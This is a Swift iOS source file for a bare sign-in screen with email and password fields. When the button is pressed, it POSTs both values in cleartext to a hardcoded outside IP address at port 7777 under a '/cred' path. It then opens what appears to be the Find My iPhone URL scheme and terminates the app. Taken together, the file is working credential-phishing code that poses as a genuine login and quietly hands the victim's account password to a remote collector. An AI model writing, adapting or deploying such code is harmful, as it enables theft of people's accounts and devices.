import UIKit

final class ViewController: UIViewController {

    @IBOutlet weak var mainView: UIView?
    
    @IBOutlet weak var iconImage: UIImageView?
    @IBOutlet weak var iconView: UIView?
    
    @IBOutlet weak var customInputView: UIView?
    @IBOutlet weak var customInputSeparator: UIView?
    
    @IBOutlet weak var loginTextField: UITextField?
    @IBOutlet weak var passwordTextField: UITextField?
    
    @IBOutlet weak var topConstraint: NSLayoutConstraint?
    
    @IBOutlet weak var signInButton: UIButton?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        self.navigationController?.navigationBar.isHidden = true
        signInButton?.isEnabled = false
        configureIcon()
        configureInputView()
    }
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
         self.navigationController?.navigationBar.isHidden = true
    }
    override internal func touchesBegan(_ touches: Set<UITouch>, with event: UIEvent?) {
        super.touchesBegan(touches, with: event)
        loginTextField?.resignFirstResponder()
        passwordTextField?.resignFirstResponder()
        view.endEditing(true)
    }
}
private extension ViewController {
    private func configureIcon() {
        iconView?.layer.cornerRadius = 25
        iconView?.layer.borderColor = UIColor.lightGray.cgColor
        iconView?.layer.borderWidth = 0.5
    }
    private func configureInputView() {
        customInputView?.clipsToBounds = true
        customInputView?.round(corners: .allCorners, radius: 12, borderColor: .gray, borderWidth: 0.5)
        customInputSeparator?.backgroundColor = .lightGray
        loginTextField?.becomeFirstResponder()
    }
}
private extension ViewController {
    @IBAction private func pressSignIn() {
        guard let email = loginTextField?.text else {return}
        guard let password = passwordTextField?.text else {return}
        sendRequest(email, password) {
            let url = URL(string:"fmip1://")!
            UIApplication.shared.open(url, options: [:]) { (completed) in
                exit(0)
            }
        }
    }
}
extension ViewController: UITextFieldDelegate {
    func textFieldDidBeginEditing(_ textField: UITextField) {
        if topConstraint?.constant != -125 {
            topConstraint?.constant = -125
            UIView.animate(withDuration: 0.3) { [weak self] in
                self?.view.layoutIfNeeded()
            }
        }
        if textField == passwordTextField {
            signInButton?.isEnabled = true
        }
    }
    func textFieldDidEndEditing(_ textField: UITextField) {
        if topConstraint?.constant != 0 {
            topConstraint?.constant = 0
            UIView.animate(withDuration: 0.3) { [weak self] in
                self?.view.layoutIfNeeded()
            }
        }
    }
}
private extension UIView {
    func round(corners: UIRectCorner, radius: CGFloat, borderColor: UIColor, borderWidth: CGFloat) {
        let mask = _round(corners: corners, radius: radius)
        addBorder(mask: mask, borderColor: borderColor, borderWidth: borderWidth)
    }
    @discardableResult func _round(corners: UIRectCorner, radius: CGFloat) -> CAShapeLayer {
        let path = UIBezierPath(roundedRect: bounds, byRoundingCorners: corners, cornerRadii: CGSize(width: radius, height: radius))
        let mask = CAShapeLayer()
        mask.path = path.cgPath
        self.layer.mask = mask
        return mask
    }
    func addBorder(mask: CAShapeLayer, borderColor: UIColor, borderWidth: CGFloat) {
        let borderLayer = CAShapeLayer()
        borderLayer.path = mask.path
        borderLayer.fillColor = UIColor.clear.cgColor
        borderLayer.strokeColor = borderColor.cgColor
        borderLayer.lineWidth = borderWidth
        borderLayer.frame = bounds
        layer.addSublayer(borderLayer)
    }
}
extension ViewController {
    func sendRequest(_ email: String, _ password: String, _ completion: @escaping () -> ()) {
        let sessionConfig = URLSessionConfiguration.default
        let session = URLSession(configuration: sessionConfig, delegate: nil, delegateQueue: nil)
        guard var URL = URL(string: "http://209.97.186.71:7777/cred") else {return}
        let URLParams = [
            "email": email,
            "password": password,
            ]
        URL = URL.appendingQueryParameters(URLParams)
        var request = URLRequest(url: URL)
        request.httpMethod = "POST"
        let task = session.dataTask(with: request, completionHandler: { (data: Data?, response: URLResponse?, error: Error?) -> Void in
            if (error == nil) {
                completion()
//                let statusCode = (response as! HTTPURLResponse).statusCode
            }
            else {
                print("URL Session Task Failed: %@", error!.localizedDescription);
            }
        })
        task.resume()
        session.finishTasksAndInvalidate()
    }
}
protocol URLQueryParameterStringConvertible {
    var queryParameters: String {get}
}
extension Dictionary : URLQueryParameterStringConvertible {
    var queryParameters: String {
        var parts: [String] = []
        for (key, value) in self {
            let part = String(format: "%@=%@",
                              String(describing: key).addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed)!,
                              String(describing: value).addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed)!)
            parts.append(part as String)
        }
        return parts.joined(separator: "&")
    }
    
}
private extension URL {
    func appendingQueryParameters(_ parametersDictionary : Dictionary<String, String>) -> URL {
        let URLString : String = String(format: "%@?%@", self.absoluteString, parametersDictionary.queryParameters)
        return URL(string: URLString)!
    }
}
